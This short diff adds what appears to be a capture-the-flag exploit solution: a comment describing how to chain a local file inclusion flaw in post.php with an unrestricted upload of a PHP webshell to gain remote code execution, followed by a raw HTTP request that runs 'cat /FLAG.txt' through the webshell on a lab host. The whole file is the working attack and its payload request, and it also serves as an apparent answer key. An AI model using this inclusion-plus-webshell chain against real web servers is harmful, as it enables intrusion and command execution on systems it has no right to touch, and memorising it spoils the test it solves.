@@ -1,0 +1,4 @@
+# LFI + unrestricted file upload to achieve RCE. Upload PHP webshell to /posts/uploads/ then include via post.php?id=uploads/webshell. Returns flag from /FLAG.txt.
+
+GET /post.php?id=uploads/webshell&cmd=cat+/FLAG.txt HTTP/1.1
+Host: 172.17.0.1:41843
